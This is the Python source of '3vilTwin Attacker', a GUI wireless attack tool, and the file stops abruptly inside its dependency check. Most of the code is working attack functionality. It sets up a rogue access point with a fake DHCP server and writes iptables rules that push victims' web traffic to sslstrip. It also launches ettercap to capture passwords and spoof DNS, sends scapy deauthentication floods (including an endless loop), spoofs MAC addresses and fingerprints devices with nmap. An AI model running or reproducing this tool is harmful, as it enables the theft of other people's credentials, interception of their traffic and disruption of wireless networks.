#! /usr/bin/python
#coding: utf-8

#P0cL4bs Team * { N4sss , MMXM , Kwrnel, MovCode, joridos, Mh4x0f, Brenords} *
#The MIT License (MIT)
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

from PyQt4.QtGui import *
from PyQt4.QtCore import *
from re import search
from os import system,path,mkdir,geteuid,popen
from platform import dist
from subprocess import Popen,PIPE
from shutil import move
from scapy.all import *
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from time import sleep
import threading
import subprocess
import random

BOLD = '\033[1m'
BLUE = '\033[34m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
RED = '\033[91m'
ENDC = '\033[0m'
__author__ = ' @mh4x0f P0cl4bs Team'
__version__= "0.5.3 Beta"
__date__= "17/02/2015"
def placa():
    comando = "ls -1 /sys/class/net"
    proc = Popen(comando,stdout=PIPE, shell=True)
    data = proc.communicate()[0]
    return  data.split('\n')

class frmControl(QMainWindow):
    def __init__(self, parent=None):
        super(frmControl, self).__init__(parent)
        self.form_widget = frm_main(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle("3vilTwin  Attacker v" + __version__)

    def closeEvent(self, event):
        reply = QMessageBox.question(self, 'About',"Are you sure to quit?", QMessageBox.Yes |
            QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
            if os.getuid() == 0:
                system("airmon-ng stop mon0")
                system("clear")
                self.deleteLater()
            else:
                pass
        else:
            event.ignore()
    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())


class frm_Probe(QMainWindow):
    def __init__(self, parent=None):
        super(frm_Probe, self).__init__(parent)
        self.form_widget = frm_PMonitor(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowIcon(QIcon('Module/icon.ico'))

class frm_mac_changer(QMainWindow):
    def __init__(self, parent=None):
        super(frm_mac_changer, self).__init__(parent)
        self.form_widget = frm_mac_generator(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowIcon(QIcon('Module/icon.ico'))


class frm_list_IP(QMainWindow):
    def __init__(self, parent=None):
        super(frm_list_IP, self).__init__(parent)
        self.form_widget = frm_GetIP(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowIcon(QIcon('Module/icon.ico'))



class frm_window(QMainWindow):
    def __init__(self, parent=None):
        super(frm_window, self).__init__(parent)
        self.form_widget = frm_deauth(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle("Deauth Attack wireless Route")
        self.setWindowIcon(QIcon('Module/icon.ico'))

    def closeEvent(self, event):
        reply = QMessageBox.question(self, 'About Exit',"Are you sure to quit?", QMessageBox.Yes |
            QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
            if os.getuid() == 0:
                system("airmon-ng stop mon0")
                system("clear")
                self.deleteLater()
            else:
                pass
        else:
            event.ignore()


class frm_main(QWidget):
    def __init__(self, parent = None):
        super(frm_main, self).__init__(parent)
        self.create_sys_tray()
        self.Main = QVBoxLayout()
        self.intGUI()
        self.setGeometry(0, 0, 300, 400)
        self.interface = "mon0"

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())
        
    def intGUI(self):

        self.myQMenuBar = QMenuBar(self)
        self.myQMenuBar.setFixedWidth(400)
        Menu_file = self.myQMenuBar.addMenu('&File')
        exitAction = QAction('Exit', self)
        exitAction.triggered.connect(self.close)
        Menu_file.addAction(exitAction)
        Menu_tools = self.myQMenuBar.addMenu('&Tools')

        etter_conf = QAction("Edit Etter.dns", self)
        etter_conf.setShortcut("Ctrl+U")
        dns_spoof = QAction("Active Dns Spoof", self)
        dns_spoof.setShortcut("Ctrl+D")
        ettercap = QAction("Active Ettercap", self)
        ettercap.setShortcut("Ctrl+E")
        ssl = QAction("Active Sslstrip ", self)
        ssl.setShortcut("Ctrl+S")
        btn_drift = QAction("Active DriftNet", self)
        btn_drift.setShortcut("Ctrl+Y")

        etter_conf.triggered.connect(self.Edit_etter)
        dns_spoof.triggered.connect(self.start_dns)
        ettercap.triggered.connect(self.start_etter)
        ssl.triggered.connect(self.start_ssl)
        btn_drift.triggered.connect(self.start_dift)

        Menu_tools.addAction(etter_conf)
        Menu_tools.addAction(dns_spoof)
        Menu_tools.addAction(ettercap)
        Menu_tools.addAction(ssl)
        Menu_tools.addAction(btn_drift)

        Menu_module = self.myQMenuBar.addMenu("&Module")
        btn_deauth = QAction("Deauth Attack", self)
        btn_deauth.setShortcut("Ctrl+W")
        btn_probe = QAction("Probe Request",self)
        btn_probe.setShortcut("Ctrl+K")
        btn_mac = QAction("Mac Changer", self)
        btn_mac.setShortcut("Ctrl+M")
        btn_ip_list = QAction("Device FingerPrint", self)
        btn_ip_list.setShortcut("Ctrl+G")

        btn_probe.triggered.connect(self.showProbe)
        btn_deauth.triggered.connect(self.newwindow)
        btn_mac.triggered.connect(self.form_mac)
        btn_ip_list.triggered.connect(self.form_list)

        Menu_module.addAction(btn_deauth)
        Menu_module.addAction(btn_probe)
        Menu_module.addAction(btn_mac)
        Menu_module.addAction(btn_ip_list)

        Menu_extra= self.myQMenuBar.addMenu("&Extra")
        Menu_about = QAction("About",self)
        Menu_help = QAction("Help",self)

        Menu_about.triggered.connect(self.about)
        Menu_help.triggered.connect(self.help)

        Menu_extra.addAction(Menu_about)
        Menu_extra.addAction(Menu_help)

        self.input_gw = QLineEdit(self)
        self.input_AP = QLineEdit(self)
        self.input_canal = QLineEdit(self)
        self.w = QComboBox(self)

        n = placa()
        for i,j in enumerate(n):
            if search("wlan", j):
                self.w.addItem(n[i])

        self.form = QFormLayout()
        hLine = QFrame()
        hLine.setFrameStyle(QFrame.HLine)
        hLine.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        hLine2 = QFrame()
        hLine2.setFrameStyle(QFrame.HLine)
        hLine2.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        vbox = QVBoxLayout()
        vbox.setMargin(5)
        vbox.addStretch(20)
        self.form.addRow(vbox)

        self.logo = QPixmap("Module/logo.png")
        self.label_imagem = QLabel()
        self.label_imagem.setPixmap(self.logo)
        self.form.addRow(self.label_imagem)

        self.form.addRow("Geteway:", self.input_gw)
        self.form.addRow("AP Name:", self.input_AP)
        self.form.addRow("Channel:", self.input_canal)
        self.form.addRow("Network Card List:", self.w)

        self.btn_start_attack = QPushButton("Start Attack", self)
        self.btn_start_attack.setFixedWidth(160)
        self.btn_cancelar = QPushButton("Stop Attack", self)
        self.btn_cancelar.setFixedWidth(160)
        self.btn_cancelar.clicked.connect(self.kill)
        self.btn_start_attack.clicked.connect(self.start_air)

        self.dialogTextBrowser = frm_window(self)
        self.form2 = QFormLayout()
        self.form2.addRow(self.btn_start_attack, self.btn_cancelar)
        self.listbox = QListWidget(self)

        self.form2.addRow(self.listbox)
        self.Main.addLayout(self.form)
        self.Main.addLayout(self.form2)

        self.setLayout(self.Main)
    def showProbe(self):
        self.p = frm_PMonitor()
        self.p.setGeometry(QRect(100, 100, 400, 200))
        self.p.show()
    def newwindow(self):
        self.w = frm_window()
        self.w.setGeometry(QRect(100, 100, 400, 200))
        self.w.show()

    def form_mac(self):
        self.w = frm_mac_generator()
        self.w.setGeometry(QRect(100, 100, 300, 100))
        self.w.show()
    def form_list(self):
        self.w = frm_GetIP()
        self.w.setGeometry(QRect(100, 100, 450, 300))
        self.w.show()
    def kill(self):
        nano = ["echo \"0\" > /proc/sys/net/ipv4/ip_forward","iptables --flush",  "iptables --table nat --flush" ,\
                "iptables --delete-chain", "iptables --table nat --delete-chain", \
                "airmon-ng stop mon0" , "rm Config/confiptables.sh" , \
                 "ifconfig lo down","ifconfig at0 down &"]
        for delete in nano:
            system(delete)
        self.listbox.clear()
        system("killall xterm")
        QMessageBox.information(self,"Clear Setting", "Log CLear success ")
        system("clear")

    def start_etter(self):
        system("sudo xterm -geometry 73x25-1+50 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w passwords -i at0 & ettercapid=$!")
    def start_ssl(self):
        system("sudo xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -k -l 10000 & sslstripid=$!")
    def start_dns(self):
        system("sudo xterm -geometry 73x25-1+250 -T DNSSpoof -e ettercap -P dns_spoof -T -q -M arp // // -i at0 & dnscapid=$!")
    def start_dift(self):
        system("sudo xterm -geometry 75x15+1+200 -T DriftNet -e driftnet -i at0 & driftnetid=$!")
    def configure(self):

        self.listbox.addItem("{+} Setting dhcpd Server...")
        self.configuradhcp = open("Config/dhcpd.conf","w")
        self.configuradhcp.write("""authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name "%s";
option domain-name-servers 10.0.0.1;
range 10.0.0.20 10.0.0.50;
}"""%(self.input_AP.text()))
        self.listbox.addItem("{+} Configure Network Fake Dhcp...")
        if path.isfile("/etc/dhcp/dhcpd.conf"):
            system("rm /etc/dhcp/dhcpd.conf")
            move("Config/dhcpd.conf", "/etc/dhcp/")
        else:
            move("Config/dhcpd.conf", "/etc/dhcp/")
        self.listbox.addItem("{+} Setting interface at0 Network...")
        self.conf_iptables = open("Config/confiptables.sh", "w")
        self.conf_iptables.write("""echo "[+] Setting iptables..."
ifconfig lo up
ifconfig at0 up &
sleep 1
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to %s
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables --table nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.101
iptables -t nat -A POSTROUTING -j MASQUERADE
echo "[+] Startup DHCP..."
touch /var/run/dhcpd.pid
sudo  dhcpd -d -f -cf \"/etc/dhcp/dhcpd.conf\" at0
sleep 3
"""%(self.input_gw.text(),self.w.currentText()))
        self.conf_iptables.close()
        self.listbox.addItem("{+} Add Getway Interface DNET...")
        self.listbox.addItem("{+} SET POSTROUTING MASQUEREDE...")
        self.listbox.addItem("{+} Add REDIRECT port 10000 Iptables...")
        self.listbox.addItem("{+} IPtables Set with success...")
        system("chmod +x Config/confiptables.sh")
        system("xterm -geometry 75x15+1+250 -e 'bash -c \"./Config/confiptables.sh; exec bash\"' & configure=$!")
        self.configuradhcp.close()
    def start_air(self):
        dot = 1
        self.listbox.clear()
        if self.w.currentText() == "":
            QMessageBox.information(self,"Error", "Network interface not supported :(")
        else:
            if path.exists("Config/"):
                print(":::")
                if not geteuid() == 0:
                    QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
                    dot = 0
            else:
                mkdir("Config")
                dot = 0
            if dot == 1:
                system("airmon-ng start %s" %(self.w.currentText()))
                self.listbox.addItem("{+} Start airmon-ng %s"%self.w.currentText())
                system("sudo xterm -geometry 75x15+1+0 -T \"Fake AP - %s - Statup\" -e airbase-ng -c %s -e \"%s\" %s & fakeapid=$!"""%(self.interface,self.input_canal.text(),self.input_AP.text(),self.interface))
                sleep(5)
                self.configure()
                self.listbox.addItem("{+} Done")

    def Edit_etter(self):
        n = dist()
        if n[0] == "Ubuntu":
            system("xterm -e nano /etc/ettercap/etter.dns")
        elif n[0] == "debian":
            system("xterm -e nano /usr/share/ettercap/etter.dns")
        else:
            QMessageBox.information(self,"Error", "Path etter.dns not found")

    def create_sys_tray(self):
        self.sysTray = QSystemTrayIcon(self)
        self.sysTray.setIcon(QIcon('Module/icon.ico'))
        self.sysTray.setVisible(True)
        self.connect(self.sysTray, SIGNAL("activated(QSystemTrayIcon::ActivationReason)"), self.on_sys_tray_activated)

        self.sysTrayMenu = QMenu(self)
        act = self.sysTrayMenu.addAction("FOO")

    def on_sys_tray_activated(self, reason):
        if reason == 3:
            self.showNormal()
        elif reason == 2:
            self.showMinimized()
    def about(self):
        QMessageBox.about(self, self.tr("About 3vilTiwn Attacker"),
            self.tr("3vilTiwn Attacker\n"
                    "Version:%s\n"
                    "Update:%s\n"
                    "Contact: p0cL4bs@gmail.com\n"
                    "The MIT License (MIT)\n"
                    "Author:%s\n"
                    "Copyright(c) 2015\n"% ( __version__, __date__, __author__)))
    def help(self):
        QMessageBox.about(self, self.tr("Help 3vilTiwn Attacker"),
            self.tr("3vilTiwn Attacker\n\n"
                    "Contact: p0cL4bs@gmail.com\n"
                    "Report bug please!!\n\n"))

class frm_deauth(QWidget):
    def __init__(self, parent=None):
        super(frm_deauth, self).__init__(parent)
        self.Main = QVBoxLayout()
        self.window_qt()
        self.interface = "mon0"
        self.ap_list = []
        self.pacote = []
        self.control = None
    def window_qt(self):
        self.controlador = QLabel("")
        self.attack_OFF()
        self.form0 = QFormLayout()
        self.form1 = QFormLayout()
        self.form2 = QFormLayout()
        self.list = QListWidget()
        self.list.clicked.connect(self.list_clicked)
        self.list.setFixedHeight(260)

        self.linetarget = QLineEdit()
        self.input_client = QLineEdit(self)
        self.input_client.setText("FF:FF:FF:FF:FF:FF")
        self.btn_enviar = QPushButton("Send Attack", self)
        self.btn_enviar.clicked.connect(self.attack_deauth)
        self.btn_scan = QPushButton(" Network Scan ", self)
        self.btn_scan.clicked.connect(self.exec_sniff)
        self.btn_stop = QPushButton("Stop  Attack ", self)
        self.btn_stop.clicked.connect(self.kill_thread)
        self.btn_enviar.setFixedWidth(200)
        self.btn_stop.setFixedWidth(200)

        self.w_pacote = QComboBox(self)
        self.w_pacote.addItem("1000 ")
        self.w_pacote.addItem("2000 ")
        self.w_pacote.addItem("3000 ")
        self.w_pacote.addItem("4000 ")
        self.w_pacote.addItem("5000 ")
        self.w_pacote.addItem("10000 ")

        self.w_pacote.addItem("infinite loop")
        self.time_scan = QComboBox(self)
        self.time_scan.addItem("10s")
        self.time_scan.addItem("20s")
        self.time_scan.addItem("30s")
        self.get_placa = QComboBox(self)
        n = placa()
        for i,j in enumerate(n):
            if search("wlan", j):
                self.get_placa.addItem(n[i])
        self.form0.addRow("Network scan time:", self.time_scan)
        self.form1.addRow(self.list)
        self.form1.addRow(self.get_placa, self.btn_scan)
        self.form1.addRow("Target:", self.linetarget)
        self.form1.addRow("Packet:",self.w_pacote)
        self.form1.addRow("Client:", self.input_client)
        self.form1.addRow("Status Attack:", self.controlador)
        self.form2.addRow(self.btn_enviar, self.btn_stop)

        self.Main.addLayout(self.form0)
        self.Main.addLayout(self.form1)
        self.Main.addLayout(self.form2)

        self.setLayout(self.Main)
    def kill_thread(self):
        self.control = 1
    def exec_sniff(self):
        dot =1
        count = 0
        if self.get_placa.currentText() == "":
            QMessageBox.information(self, "Network Adapter", 'Network Adapter Not found try again.')
        else:
            comando = "ifconfig"
            proc = Popen(comando,stdout=PIPE, shell=False)
            data = proc.communicate()[0]
            if search("mon0", data):
                dot = 0
                c = "airmon-ng stop mon0".split()
                Popen(c,stdout=PIPE, shell=False)
                system("airmon-ng start %s" %(self.get_placa.currentText()))
            else:
                system("airmon-ng start %s" %(self.get_placa.currentText()))
            if self.time_scan.currentText() == "10s":
                count = 300
            elif self.time_scan.currentText() == "20s":
                count = 400
            elif self.time_scan.currentText() == "30s":
                count = 600
            sniff(iface=self.interface, prn =self.Scanner_devices, count=count)
            i = 0
            items = []
            cap = []
            for i in range(len(self.ap_list) -1):
                if len(self.ap_list[i]) < len(self.ap_list[i+1]):
                    if i != 0:
                        for index in xrange(self.list.count()):
                            items.append(self.list.item(index))
                        if self.ap_list[i] or self.ap_list[i+1] in items:
                            pass
                        else:
                            self.list.addItem(self.ap_list[i] + "-" + self.ap_list[i+1])
                            if not (self.ap_list[i] + "-" + self.ap_list[i+1]) in cap:
                                cap.append(self.ap_list[i] + "-" + self.ap_list[i+1])
                    else:
                        self.list.addItem(self.ap_list[i] + "-" + self.ap_list[i+1])
                        if not (self.ap_list[i] + "-" + self.ap_list[i+1]) in cap:
                            cap.append(self.ap_list[i] + "-" + self.ap_list[i+1])
                else:
                    self.list.addItem(self.ap_list[i+1] + "-" + self.ap_list[i])
                    if not (self.ap_list[i+1] + "-" + self.ap_list[i]) in cap:
                        cap.append(self.ap_list[i+1] + "-" + self.ap_list[i])
                if  self.ap_list[i] < i:
                    pass
                    break
                else:
                    dot = 1
            self.list.clear()
            for i in cap:
                self.list.addItem(i)
            cap = []
            self.ap_list = []
    def Scanner_devices(self,pkt):
        dot = 0
        if pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 not in self.ap_list:
                self.ap_list.append(pkt.addr2)
                self.ap_list.append(pkt.info)
                print "AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)

    def attack_deauth(self):
        if self.linetarget.text() == "":
            QMessageBox.information(self, "Target Error", "Please, first select Target for attack")
        else:
            self.ss = None
            if self.w_pacote.currentText() == "infinite loop":
                self.ss = 1
            else:
                self.ss =  int(self.w_pacote.currentText())
            self.tr = str(self.linetarget.text()).split("-")
            self.bssid = None
            if len(self.tr) == 2:
                self.bssid = self.tr[1]
            else:
                for i in range(len(self.tr) -1):
                    if len(self.tr[i]) < len(self.tr[i+1]):
                        self.bssid = self.tr[i+1]
                    else:
                        self.bssid = self.tr[i]
            self.controlador.setText("[ ON ]")
            self.controlador.setStyleSheet("QLabel {  color : green; }")
            self.t = threading.Thread(target=self.deauth_attacker, args=(self.bssid,str(self.input_client.text()), self.ss))
            self.t.daemon = True
            self.t.start()

    def attack_OFF(self):
        self.controlador.setText("[ OFF ]")
        self.controlador.setStyleSheet("QLabel {  color : red; }")
        system("clear")

    def deauth_attacker(self,bssid, client, count):
        bot = 0
        conf.verb = 0
        conf.iface = self.interface
        packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
        deauth_ap = Dot11(addr1=bssid, addr2=bssid, addr3=bssid)/Dot11Deauth()
        deauth_pkt2 = Dot11(addr1=bssid, addr2=client, addr3=client)/Dot11Deauth()
        self.pacote.append(deauth_pkt2)
        self.pacote.append(deauth_ap)
        if count == 1:
            while count != 0:
                try:
                    sendp(packet)
                    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client
                    if self.control == None:
                        pass
                    else:
                        print ("[-] Deauth attack %sSTOP%s to BSSID: %s"%(RED, ENDC, bssid))
                        self.attack_OFF()
                        count = 0
                except KeyboardInterrupt:
                    print "::"
                    sys.exit()
        else:
            for n in range(int(count)):
                try:
                    sendp(packet)
                    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client
                    if self.control == None:
                        pass
                    else:
                        print ("[-] Deauth attack %sSTOP%s to BSSID: %s"%(RED, ENDC, bssid))
                        self.attack_OFF()
                        break
                except KeyboardInterrupt:
                    print "::"
                    sys.exit()
            print ("[-] Deauth attack  %sfinished%s to BSSID: %s"%(RED, ENDC, bssid))
            self.attack_OFF()
    @pyqtSlot(QModelIndex)
    def list_clicked(self, index):
        itms = self.list.selectedIndexes()
        for i in itms:
            self.linetarget.setText(i.data().toString())

class frm_PMonitor(QWidget):
    def __init__(self, parent=None):
        super(frm_PMonitor, self).__init__(parent)
        self.Main = QVBoxLayout()
        self.setWindowTitle("Probe Request wifi Monitor")
        self.setWindowIcon(QIcon('Module/icon.ico'))
        self.interface = "mon0"
        self.setupGUI()
        self.probes = []

    def setupGUI(self):
        self.form0 = QFormLayout()
        self.list_probe = QListWidget()
        self.list_probe.setFixedHeight(400)
        self.btn_scan = QPushButton("Scan")
        self.btn_scan.clicked.connect(self.Pro_request)
        self.get_placa = QComboBox(self)
        n = placa()
        for i,j in enumerate(n):
            if search("wlan", j):
                self.get_placa.addItem(n[i])

        self.time_scan = QComboBox(self)
        self.time_scan.addItem("10s")
        self.time_scan.addItem("20s")
        self.time_scan.addItem("30s")

        self.form0.addRow("Network Adapter: ", self.get_placa)
        self.form0.addRow(self.list_probe)
        self.form0.addRow("Time Scan: ", self.time_scan)
        self.form1 = QFormLayout()
        self.form1.addRow(self.btn_scan)
        self.Main.addLayout(self.form0)
        self.Main.addLayout(self.form1)

        self.setLayout(self.Main)
    def Pro_request(self):
        self.time_control = None
        if self.time_scan.currentText() == "10s":
            self.time_control = 300
        elif self.time_scan.currentText() == "20s":
            self.time_control = 400
        elif self.time_scan.currentText() == "30s":
            self.time_control = 600
        if self.get_placa.currentText() == "":
            QMessageBox.information(self, "Network Adapter", 'Network Adapter Not found try again.')
        else:
            if not geteuid() == 0:
                QMessageBox.information(self, "Permission Denied", 'the tool must be run as root try again.')
            else:
                comando = "ifconfig"
                proc = Popen(comando,stdout=PIPE, shell=True)
                data = proc.communicate()[0]
                if search("mon0", data):
                    sniff(iface=self.interface,prn=self.sniff_probe, count=self.time_control)
                    system("clear")
                else:
                    system("airmon-ng start %s" %(self.get_placa.currentText()))
                    sniff(iface=self.interface,prn=self.sniff_probe, count=self.time_control)
                    system("clear")

    def sniff_probe(self,p):
        if (p.haslayer(Dot11ProbeReq)):
                mac_address=(p.addr2)
                ssid=p[Dot11Elt].info
                ssid=ssid.decode('utf-8','ignore')
                if ssid == "":
                        ssid="null"
                else:
                        print ("[:] Probe Request from %s for SSID '%s'" %(mac_address,ssid))
                        self.probes.append("[:] Probe Request from %s for SSID '%s'" %(mac_address,ssid))
                        self.list_probe.addItem("[:] Probe Request from %s for SSID '%s'" %(mac_address,ssid))


class frm_mac_generator(QWidget):
    def __init__(self, parent=None):
        super(frm_mac_generator, self).__init__(parent)
        self.Main = QVBoxLayout()
        self.setWindowIcon(QIcon('Module/icon.ico'))
        self.setWindowTitle("MAC Address Generator & Changer")
        self.MacGUI()
        self.prefix = [ 0x00, 0xCB, 0x01,0x03 ,\
                        0x84,0x78,0xAC, 0x88,0xD3,\
                        0x7B, 0x8C,0x7C,0xB5, 0x90,0x99,0x16, \
                        0x9C, 0x6A ,0xBE , 0x55, 0x12, 0x6C , 0xD2,\
                        0x8b, 0xDA, 0xF1, 0x9c , 0x20 , 0x3A, 0x4A,\
                        0x2F, 0x31, 0x32, 0x1D, 0x5F, 0x70, 0x5A,\
                        0x5B, 0x5C, 0x63, 0x4F, 0x3F, 0x5F, 0x9E]
    def get_interface_mac(self,device):
        result = subprocess.check_output(["ifconfig", device], stderr=subprocess.STDOUT, universal_newlines=True)
        m = search("(?<=HWaddr\\s)(.*)", result)
        if not hasattr(m, "group") or m.group(0) == None:
            return None
        return m.group(0).strip()
    def placa(self):
        comando = "ls -1 /sys/class/net"
        proc = Popen(comando,stdout=PIPE, shell=True)
        data = proc.communicate()[0]
        return  data.split('\n')

    @pyqtSlot(QModelIndex)
    def combo_clicked(self, device):
        if device == "":
            self.i_mac.setText('Not Found')
        else:
            self.i_mac.setText(self.get_interface_mac(device))
    def randomMacAddress(self,prefix):
        for _ in xrange(6-len(prefix)):
            prefix.append(random.randint(0x00, 0x7f))
        return ':'.join('%02x' % x for x in prefix)
    def action_btn_random(self):
        mac = self.randomMacAddress([random.choice(self.prefix) , random.choice(self.prefix) , random.choice(self.prefix)])
        self.i_mac.setText(mac)

    def setMAC(self,device,mac):
        subprocess.check_call(["ifconfig","%s" % device, "up"])
        subprocess.check_call(["ifconfig","%s" % device, "hw", "ether","%s" % mac])

    def change_macaddress(self):
        if not geteuid() == 0:
            QMessageBox.information(self, "Permission Denied", 'Tool must be run as root try again.')
        else:
            self.setMAC(self.combo_card.currentText(), self.i_mac.text())
            self.deleteLater()
    def MacGUI(self):
        self.form_mac = QFormLayout()
        self.i_mac = QLineEdit(self)
        self.combo_card = QComboBox(self)
        self.btn_random = QPushButton("Random MAC")
        self.btn_save = QPushButton("Save")
        self.btn_save.clicked.connect(self.change_macaddress)
        self.btn_random.clicked.connect(self.action_btn_random)
        self.n = self.placa()
        self.combo_card.addItems(self.n)
        self.connect(self.combo_card, SIGNAL('activated(QString)'), self.combo_clicked)
        self.form_mac.addRow(self.combo_card,self.i_mac)
        self.form_mac.addRow("MAC Random: ", self.btn_random)
        self.form_mac.addRow(self.btn_save)
        self.Main.addLayout(self.form_mac)
        self.setLayout(self.Main)

class frm_GetIP(QWidget):
    def __init__(self, parent=None):
        super(frm_GetIP, self).__init__(parent)
        self.Main = QVBoxLayout()
        self.setWindowIcon(QIcon('Module/icon.ico'))
        self.setWindowTitle("Device fingerprint wireless network")
        self.listGUI()
    def get_clients(self):
        output =  popen("route | grep default ")
        conf =  output.read().split()
        if conf != []:
            conf = conf[1]
            getway_default = conf[:len(conf)-1] + "*"
            self.nmap_get_ip(getway_default)
        else:
            QMessageBox.information(self, "Network Error", 'You need be connected the internet try again.')
    def get_mac(self,host):
        fields = os.popen('grep "%s " /proc/net/arp' % host).read().split()
        if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
            return fields[3]
        else:
            return ' not detected'
    def get_OS(self, ipaddress):
        output =  popen("route | grep default ")
        conf =  output.read().split()
        if conf != []:
            route = conf[1]
            if ipaddress != route:
                data = popen("nmap -A -O -Pn %s | grep 'OS'"%(ipaddress)).read()
                if search(":microsoft:windows_7", data):
                    file = popen("nmap -A -sV -O %s | grep 'NetBIOS computer name'"%(ipaddress)).read().split()
                    return " Windows 2008|7|Phone|Vista | PC Name: " + file[4]
                elif search("Apple", data):
                    return " Iphone Or MAC oS"
                elif search("linux",data):
                    if search(":android:", data):
                        return " Android"
                    else:
                        return " Linux"
                elif search("", data):
                    return "OS Unknown"
            else:
                return "Router"
        else:
            QMessageBox.information(self, "Network Error", 'You need be connected the internet try again.')
    def nmap_get_ip(self,geteway):
        self.lb_clients.clear()
        self.setStyleSheet('QListWidget {color: yellow}')
        clients = popen("nmap -sP "+ geteway)
        c = clients.read().split()
        for i,j in enumerate(c):
            if j.count(".") == 3:
                if self.cb_getOS.isChecked():
                    if not geteuid() == 0:
                        QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
                        break
                    else:
                        self.lb_clients.addItem(c[i] + "| " + str(self.get_mac(c[i]) + "|" + str(self.get_OS(c[i]))))
                else:
                    self.lb_clients.addItem(c[i] + "| " + str(self.get_mac(c[i])))
    def listGUI(self):
        self.form0 = QFormLayout()
        self.lb_clients = QListWidget(self)
        self.cb_getOS = QCheckBox("Detect OS")
        self.btn_scan = QPushButton("Scan Clients")
        self.btn_scan.clicked.connect(self.get_clients)
        self.label1 = QLabel("IPAddress")
        self.label2 = QLabel("     | MACAddress      |   OS")
        self.form0.addRow(self.label1, self.label2)
        self.form0.addRow(self.lb_clients)
        self.form0.addRow("You Need Root:" , self.cb_getOS)
        self.form0.addRow(self.btn_scan)
        self.Main.addLayout(self.form0)
        self.setLayout(self.Main)
def dhcp_install():
        print ' +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
        print '|                         Pleace Necessary install dhcpd                            |'
        print '|-----------------------------------------------------------------------------------|'
        print '|                            >>> Solution Ubuntu <<<                                |'
        print '|~#sudo apt-get install isc-dhcp-server                                             |'
        print '|-----------------------------------------------------------------------------------|'
        print '|                        >>> Solution Debian wheezy <<<                             |'
        print '|~# echo "deb http://ftp.de.debian.org/debian wheezy main " >> /etc/apt/sources.list|'
        print '|~# apt-get update && apt-get install isc-dhcp-server                               |'
        print '|-----------------------------------------------------------------------------------|'
        print ' +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'

if __name__ == '__main__':
    import sys
    print("[+] checking dependencies...")
    print"============================="
    ettercap = popen("which ettercap").read().split("\n")
    sslstrip = popen("which sslstrip").read().split("\n")
    xterm = popen("which xterm").read().split("\n")
    dhcpd = popen("which dhcpd").read().split("\n")
    nmap = popen("which nmap").read().split("\n")
    lista = [dhcpd[0], "/usr/sbin/airbase-ng", ettercap[0], sslstrip[0],xterm[0],nmap[0]]
    m = []
    j = 0
    for i in lista:
        m.append(path.isfile(i))
        j += 1
    for a,b in enumerate(m):
        if m[a] == False:
            if a == 0:
                print("{-} dhcpd --> [%sOFF%s]...      |"%(RED,ENDC))
            elif a == 1:
                print("{-} airbase-ng --> [%sOFF%s]... |"%(RED,ENDC))
            elif a == 2:
                print("{-} ettercap --> [%sOFF%s]...   |"%(RED,ENDC))
            elif a == 3:
                print("{-} sslstrip --> [%sOFF%s]...   |"%(RED,ENDC))
            elif a == 4:
                print("{-} Xterm  --> [%sOFF%s]...     |"%(RED,ENDC))
            elif a == 5:
